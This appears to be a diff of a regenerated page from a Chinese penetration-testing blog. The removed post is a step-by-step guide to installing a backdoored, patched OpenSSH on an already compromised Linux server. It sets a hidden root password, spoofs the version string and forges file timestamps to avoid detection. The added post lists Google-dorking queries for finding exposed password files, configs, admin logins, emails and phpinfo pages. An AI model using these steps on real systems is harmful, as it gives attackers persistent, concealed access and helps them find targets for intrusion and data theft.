@@ -15,11 +15,11 @@
     <script async defer src="https://buttons.github.io/buttons.js"></script>
     <title>
         
-          SSH后门安装 - 明心 | Blog
+          信息搜集之谷歌语法 - 明心 | Blog
         
     </title>
 
-    <link rel="canonical" href="http://www.mingxin.live/article/SSH后门安装/">
+    <link rel="canonical" href="http://www.mingxin.live/article/信息搜集之谷歌语法/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -72,7 +72,7 @@
 <style type="text/css">
     header.intro-header{
         
-            background-image: url('/img/article_header/2.jpg')
+            background-image: url('/img/article_header/3.jpg')
             /*post*/
         
     }
@@ -96,8 +96,8 @@
                               <a class="tag" href="/tags/#渗透测试" title="渗透测试">渗透测试</a>
                             
                         </div>
-                        <h1>SSH后门安装</h1>
-                        <h2 class="subheading">通过实践学习熟悉Linux SSH后门的安装过程和步骤</h2>
+                        <h1>信息搜集之谷歌语法</h1>
+                        <h2 class="subheading">信息搜集之Google hacking语法</h2>
                         <span class="meta">
                             Posted by 明心 on
                             2019-04-28
@@ -217,63 +217,105 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <h1 id="ssh后门安装">SSH后门安装</h1>
+                <h1 id="信息收集之谷歌语法">信息收集之谷歌语法</h1>
 <h2 id="一前言">一：前言</h2>
-<p>通过WinSCP与Linux服务器进行连接，然后配置安装SSH后门，这次实验主要目的通过实践学习熟悉Linux SSH后门的安装过程和步骤。</p>
-<h2 id="二配置ssh后门">二：配置SSH后门</h2>
-<h3 id="21建立连接">2.1：建立连接</h3>
-<p>利用winSCP工具（也可以选用其他工具）连接已知（即已经渗透成功的服务器）服务器，如图：</p>
-<p><img src="//mingxin.live/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/1.jpg" alt=""></p>
-<p>连接成功后：</p>
-<p><img src="//mingxin.live/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/2.jpg" alt=""></p>
-<p>用SecureCRT连接成功后如图：</p>
-<p><img src="//mingxin.live/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/3.jpg" alt=""></p>
-<p>通过<code>ssh -V</code>查看当前SSH版本</p>
-<p><strong>上传带有后门的SSH安装包</strong></p>
-<p>上传工具（上面提到的WinSCP、SecureCRT、putty都可以，自行选择）</p>
-<p><img src="//mingxin.live/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/4.jpg" alt=""></p>
-<p><strong>解压上传的安装包</strong></p>
-<p>tar zxf openssh-5.9p1.tar.gz</p>
-<p>tar zxf 0x06-openssh-5.9p1.patch.tar.gz</p>
-<p><img src="//mingxin.live/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/5.jpg" alt=""></p>
-<p><strong>执行如下命令，移动原有配置文件</strong></p>
-<hr>
-<p>mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old</p>
-<p>mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old</p>
-<hr>
-<p><strong>复制文件sshbd5.9p1.diff到openssh-5.9p1目录</strong></p>
-<hr>
-<p>cd openssh-5.9p1.patch/</p>
-<p>cp sshbd5.9p1.diff …/openssh-5.9p1</p>
-<p>cd …/openssh-5.9p1</p>
-<p>patch &lt; sshbd5.9p1.diff</p>
-<hr>
-<p><img src="//mingxin.live/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/6.jpg" alt=""></p>
-<p><strong>编辑includes.h文件，设置自己的后门密码</strong></p>
-<hr>
-<p>vi includes.h</p>
-<p>找到#define SECRETPW “apaajaboleh”   // apaajaboleh为后门的密码 可修改成自己设定的密码，如图</p>
-<p><img src="//mingxin.live/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/7.jpg" alt=""></p>
-<hr>
-<p><strong>修改当前系统的SSH版本</strong></p>
-<hr>
-<p>通过<code>ssh -V</code>查看当前SSH版本，记录下来</p>
-<p>vi version.h  修改version.h文件的版本信息</p>
-<p><img src="//mingxin.live/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/8.jpg" alt="8"></p>
-<hr>
-<h2 id="三安装ssh后门">三：安装SSH后门</h2>
-<hr>
-<p>执行./configure --prefix=/usr --sysconfdir=/etc/ssh指定配置选项</p>
-<p>执行make &amp;&amp; make install 编译安装</p>
-<p><strong>安转完成后如图：</strong></p>
-<p><img src="//mingxin.live/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/9.jpg" alt=""></p>
-<p>touch -r  /etc/ssh/ssh_config.old /etc/ssh/ssh_config //修改日期</p>
-<p>touch -r  /etc/ssh/sshd_config.old /etc/ssh/sshd_config //修改日期</p>
-<p>/etc/init.d/ssh restart     //重启ssh服务</p>
-<hr>
-<h2 id="四测试后门是否安装成功">四：测试后门是否安装成功</h2>
-<p>用连接工具连接，用户名为root，密码为前面设置的SSH后门的密码</p>
-<p><img src="//mingxin.live/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/10.jpg" alt=""></p>
+<p>谷歌语法的作用，谷歌作为最大的搜索引擎，利用其强大的搜索能力可以方便快捷的找到我们需要的信息，例如：子域名、后台管理地址、，敏感信息、以及可能存在漏洞的网页</p>
+<h2 id="二语法">二：语法</h2>
+<h3 id="21限制搜索范围">2.1：限制搜索范围</h3>
+<ul>
+<li>
+<p>site：限制你搜索域名的范围，将搜索范围限制在某网站或顶级域名中</p>
+</li>
+<li>
+<p>“关键词”：给关键词加上半角引号实现<strong>精确搜索</strong></p>
+</li>
+<li>
+<p>通配符 * ：必须在半角双引号内使用，用通配符代替关键词中无法确定的字词， * 前后需要加空格</p>
+</li>
+<li>
+<p>布尔逻辑：</p>
+<ul>
+<li>
+<p>逻辑与：and</p>
+<p>【A and B ：检索同时含有A和B的内容】</p>
+</li>
+<li>
+<p>逻辑或：|</p>
+<p>【关键词（A|B）：检索包含关键词带有A或B的内容】</p>
+</li>
+<li>
+<p>逻辑非：-</p>
+<p>【去掉相关检索内容】</p>
+</li>
+</ul>
+</li>
+<li>
+<p>约束条件：+</p>
+<p>“+”用于强制搜索，几必须包含<code>+</code>后的内容，一般与<strong>精确搜索</strong>一起应用</p>
+</li>
+</ul>
+<h3 id="22高级搜索">2.2：高级搜索</h3>
+<p>2.2.1：info：查看指定站点的基本信息</p>
+<p>2.2.2：intitle：标题搜索</p>
+<p>即搜索页面中title标签包含关键字的页面</p>
+<p>2.2.3：intext：内容(正文)搜索</p>
+<p>2.2.4：inurl：对url进行限制，搜索URL中含有关键字的内容</p>
+<p>例：inurl:robots.txt、inurl:8080/ inurl:jsp</p>
+<p>2.2.5：filetype：对文档类型进行限定</p>
+<p>支持的文档有：pdf、ppt、doc、xls、conf、inc、mdb等；网页文件：htm、asp、php等。</p>
+<p>2.2.6：related：搜索相关信息</p>
+<p>related语法对于发现某一类信息非常有用 搜索相关信息</p>
+<p>2.2.7：link：搜索所有链接到某个特定url的页面</p>
+<p>例如: link:jyc.xupt.edu.cn</p>
+<p><img src="//mingxin.live/img/%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95/3.jpg" alt=""></p>
+<p>2.2.8：site：搜索范围限制在某网站或顶级域名中</p>
+<h2 id="三google-hacking应用">三：Google hacking应用</h2>
+<h3 id="31搜索敏感文件">3.1：搜索敏感文件</h3>
+<ul>
+<li>site:xxx.com filetype:doc intext:pass</li>
+<li>site:xxx.com filetype:xls intext:pass</li>
+<li>site:xxx.com filetype:conf</li>
+<li>site:xxx.com filetype:inc</li>
+<li>filetype:log iserror.log</li>
+<li>…</li>
+</ul>
+<p>例：site:jyc.xupt.edu.cn filetype:doc</p>
+<p><img src="//mingxin.live/img/%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95/1.jpg" alt=""></p>
+<h3 id="32搜索管理后台">3.2：搜索管理后台</h3>
+<ul>
+<li>
+<p>site:xxx.com admin</p>
+</li>
+<li>
+<p>site:xxx.com login</p>
+</li>
+<li>
+<p>site:xxx.com 管理</p>
+</li>
+<li>
+<p>intitle:登陆 intext:username inurl:login.jsp</p>
+</li>
+<li>
+<p>…</p>
+<p><img src="//mingxin.live/img/%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95/.jpg" alt=""></p>
+</li>
+</ul>
+<h3 id="33搜索mail">3.3：搜索mail</h3>
+<ul>
+<li>site:xxx.com <a href="mailto:intext:@xxx.com" target="_blank" rel="noopener">intext:@xxx.com</a></li>
+<li><a href="mailto:intext:@xxx.com" target="_blank" rel="noopener">intext:@xxx.com</a></li>
+<li>…</li>
+</ul>
+<h3 id="34搜索敏感web路径">3.4：搜索敏感web路径</h3>
+<ul>
+<li>site:xxx.com intitle:mongod inurl:28017</li>
+<li>site:xxx.com inurl:sql.php</li>
+<li>site:xxx.com inurl:phpinfo.php</li>
+<li>inurl:jsp/demo.jsp  （查找kindedit文件上传页面）</li>
+<li>…</li>
+</ul>
+<p><img src="//mingxin.live/img/%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95/4.jpg" alt=""></p>
+<p><strong>对于各种搜索语法无法群举，应灵活运用</strong></p>
 
                 
 
@@ -281,10 +323,10 @@
                 <!-- Pager -->
                 <ul class="pager">
                     
-                        <li class="previous">
-                            <a href="/article/信息搜集之谷歌语法/" data-toggle="tooltip" data-placement="top" title="信息搜集之谷歌语法">&larr; Previous Post</a>
-                        </li>
                     
+                        <li class="next">
+                            <a href="/article/SSH后门安装/" data-toggle="tooltip" data-placement="top" title="SSH后门安装">Next Post &rarr;</a>
+                        </li>
                     
                 </ul>
 
@@ -333,7 +375,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#ssh后门安装"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">SSH&#x540E;&#x95E8;&#x5B89;&#x88C5;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#一前言"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">&#x4E00;&#xFF1A;&#x524D;&#x8A00;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#二配置ssh后门"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">&#x4E8C;&#xFF1A;&#x914D;&#x7F6E;SSH&#x540E;&#x95E8;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#21建立连接"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">2.1&#xFF1A;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#三安装ssh后门"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">&#x4E09;&#xFF1A;&#x5B89;&#x88C5;SSH&#x540E;&#x95E8;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#四测试后门是否安装成功"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">&#x56DB;&#xFF1A;&#x6D4B;&#x8BD5;&#x540E;&#x95E8;&#x662F;&#x5426;&#x5B89;&#x88C5;&#x6210;&#x529F;</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#信息收集之谷歌语法"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">&#x4FE1;&#x606F;&#x6536;&#x96C6;&#x4E4B;&#x8C37;&#x6B4C;&#x8BED;&#x6CD5;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#一前言"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">&#x4E00;&#xFF1A;&#x524D;&#x8A00;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#二语法"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">&#x4E8C;&#xFF1A;&#x8BED;&#x6CD5;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#21限制搜索范围"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">2.1&#xFF1A;&#x9650;&#x5236;&#x641C;&#x7D22;&#x8303;&#x56F4;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#22高级搜索"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">2.2&#xFF1A;&#x9AD8;&#x7EA7;&#x641C;&#x7D22;</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#三google-hacking应用"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">&#x4E09;&#xFF1A;Google hacking&#x5E94;&#x7528;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#31搜索敏感文件"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">3.1&#xFF1A;&#x641C;&#x7D22;&#x654F;&#x611F;&#x6587;&#x4EF6;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#32搜索管理后台"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">3.2&#xFF1A;&#x641C;&#x7D22;&#x7BA1;&#x7406;&#x540E;&#x53F0;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#33搜索mail"><span class="toc-nav-number">1.3.3.</span> <span class="toc-nav-text">3.3&#xFF1A;&#x641C;&#x7D22;mail</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#34搜索敏感web路径"><span class="toc-nav-number">1.3.4.</span> <span class="toc-nav-text">3.4&#xFF1A;&#x641C;&#x7D22;&#x654F;&#x611F;web&#x8DEF;&#x5F84;</span></a></li></ol></li></ol></li></ol>
         
         </div>
       </aside>
